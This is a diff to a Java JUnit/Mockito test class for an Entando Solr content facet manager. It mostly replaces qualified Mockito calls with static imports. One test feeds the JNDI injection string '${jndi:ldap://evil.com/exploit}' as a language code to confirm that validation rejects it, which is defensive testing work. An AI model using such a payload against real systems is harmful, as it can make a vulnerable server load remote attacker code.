@@ -3,6 +3,10 @@ package org.entando.entando.plugins.jpsolr.aps.system.content;
 import static org.mockito.ArgumentMatchers.any;
 import static org.mockito.ArgumentMatchers.eq;
 import static org.mockito.ArgumentMatchers.isNull;
+import static org.mockito.Mockito.mock;
+import static org.mockito.Mockito.never;
+import static org.mockito.Mockito.verify;
+import static org.mockito.Mockito.when;
 
 import com.agiletec.aps.system.services.authorization.IAuthorizationManager;
 import com.agiletec.aps.system.services.category.Category;
@@ -29,7 +33,6 @@ import org.junit.jupiter.params.provider.ValueSource;
 import org.mockito.ArgumentCaptor;
 import org.mockito.InjectMocks;
 import org.mockito.Mock;
-import org.mockito.Mockito;
 import org.mockito.junit.jupiter.MockitoExtension;
 
 @ExtendWith(MockitoExtension.class)
@@ -52,9 +55,9 @@ class AdvContentFacetManagerTest {
 
     @Test
     void shouldGetFacetResultWithBeansFilterAndNodeCodesAsList() throws Exception {
-        UserFilterOptionBean filterOptionBean = Mockito.mock(UserFilterOptionBean.class);
-        Mockito.when(filterOptionBean.extractFilter()).thenReturn(Mockito.mock(SearchEngineFilter.class));
-        Mockito.when(categoryManager.getCategory(CATEGORY_1)).thenReturn(new Category());
+        UserFilterOptionBean filterOptionBean = mock(UserFilterOptionBean.class);
+        when(filterOptionBean.extractFilter()).thenReturn(mock(SearchEngineFilter.class));
+        when(categoryManager.getCategory(CATEGORY_1)).thenReturn(new Category());
 
         SearchEngineFilter[] baseFilters = new SearchEngineFilter[]{};
         List<String> facetNodeCodes = List.of(CATEGORY_1, CATEGORY_2);
@@ -66,7 +69,7 @@ class AdvContentFacetManagerTest {
         ArgumentCaptor<SearchEngineFilter[]> categoryFiltersCaptor = ArgumentCaptor.forClass(
                 SearchEngineFilter[].class);
 
-        Mockito.verify(searchEngineManager).searchFacetedEntities(
+        verify(searchEngineManager).searchFacetedEntities(
                 filtersCaptor.capture(), categoryFiltersCaptor.capture(), eq(groups));
 
         SearchEngineFilter[] filters = filtersCaptor.getValue();
@@ -83,7 +86,7 @@ class AdvContentFacetManagerTest {
 
         ArgumentCaptor<SearchEngineFilter[]> filtersCaptor = ArgumentCaptor.forClass(SearchEngineFilter[].class);
 
-        Mockito.verify(searchEngineManager).searchFacetedEntities(
+        verify(searchEngineManager).searchFacetedEntities(
                 filtersCaptor.capture(), (SearchEngineFilter[]) isNull(), isNull());
 
         SearchEngineFilter[] filters = filtersCaptor.getValue();
@@ -94,7 +97,7 @@ class AdvContentFacetManagerTest {
     void shouldGetFacetResultWithNodeCodesAsFilter() throws Exception {
         SearchEngineFilter[] nodeCodesFilter = new SearchEngineFilter[]{};
         facetManager.getFacetResult(null, nodeCodesFilter, null, null);
-        Mockito.verify(searchEngineManager).searchFacetedEntities(
+        verify(searchEngineManager).searchFacetedEntities(
                 any(SearchEngineFilter[].class), eq(nodeCodesFilter), isNull());
     }
 
@@ -102,7 +105,7 @@ class AdvContentFacetManagerTest {
     void shouldRejectJndiInjectionInLang() {
         AdvRestContentListRequest request = new AdvRestContentListRequest();
         request.setLang("${jndi:ldap://evil.com/exploit}");
-        Mockito.when(langManager.getLangs()).thenReturn(List.of(createLang("en")));
+        when(langManager.getLangs()).thenReturn(List.of(createLang("en")));
         Assertions.assertThrows(ValidationConflictException.class,
                 () -> facetManager.getFacetedContents(request, null));
     }
@@ -111,7 +114,7 @@ class AdvContentFacetManagerTest {
     void shouldRejectNonExistentLangCode() {
         AdvRestContentListRequest request = new AdvRestContentListRequest();
         request.setLang("zzz");
-        Mockito.when(langManager.getLangs()).thenReturn(List.of(createLang("en")));
+        when(langManager.getLangs()).thenReturn(List.of(createLang("en")));
         Assertions.assertThrows(ValidationConflictException.class,
                 () -> facetManager.getFacetedContents(request, null));
     }
@@ -119,15 +122,15 @@ class AdvContentFacetManagerTest {
     @Test
     void shouldAcceptBlankLangCodeAndUseDefault() throws Exception {
         AdvRestContentListRequest request = new AdvRestContentListRequest();
-        Mockito.when(langManager.getDefaultLang()).thenReturn(createLang("en"));
-        Mockito.when(((ISolrSearchEngineManager) searchEngineManager)
+        when(langManager.getDefaultLang()).thenReturn(createLang("en"));
+        when(((ISolrSearchEngineManager) searchEngineManager)
                 .searchFacetedEntities(
                         any(SolrSearchEngineFilter[][].class),
                         any(SolrSearchEngineFilter[].class),
                         any(List.class)))
                 .thenReturn(new SolrFacetedContentsResult());
         facetManager.getFacetedContents(request, null);
-        Mockito.verify(langManager, Mockito.never()).getLangs();
+        verify(langManager, never()).getLangs();
     }
 
     @ParameterizedTest
